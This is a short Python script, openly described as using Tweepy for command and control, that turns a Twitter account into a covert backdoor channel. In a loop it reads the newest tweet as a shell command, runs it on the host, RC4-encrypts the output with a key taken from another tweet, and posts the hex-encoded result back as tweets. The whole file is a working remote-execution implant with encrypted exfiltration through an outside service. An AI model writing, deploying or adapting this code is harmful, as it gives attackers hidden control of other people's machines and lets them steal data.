#!/usr/bin/env python
'''
Uses Tweepy for command & control
[Usage]
    python tweets_c2.py
'''
import os
import sys
import time
import tweepy
import subprocess
from Crypto.Cipher import ARC4
from binascii import hexlify, unhexlify

consumer_key = os.environ['CONSUMER_KEY']
consumer_secret_key = os.environ['CONSUMER_SECRET_KEY']
access_token = os.environ['ACCESS_TOKEN']
access_secret = os.environ['ACCESS_SECRET']

auth = tweepy.OAuthHandler(consumer_key, consumer_secret_key)
auth.set_access_token(access_token, access_secret)
api = tweepy.API(auth)


while True:
    new_tweets = api.user_timeline(count=2)
    command = new_tweets[0].text.encode('utf8')
    response = subprocess.check_output(command.split())
    key = hexlify(new_tweets[1].text.encode('utf8'))
    enc = ARC4.new(key)
    enres = enc.encrypt(response)
    enc_payload = hexlify(enres)
    for i in range(0, len(enc_payload), 280):
        api.update_status(enc_payload[i:i+280])
        time.sleep(3600)
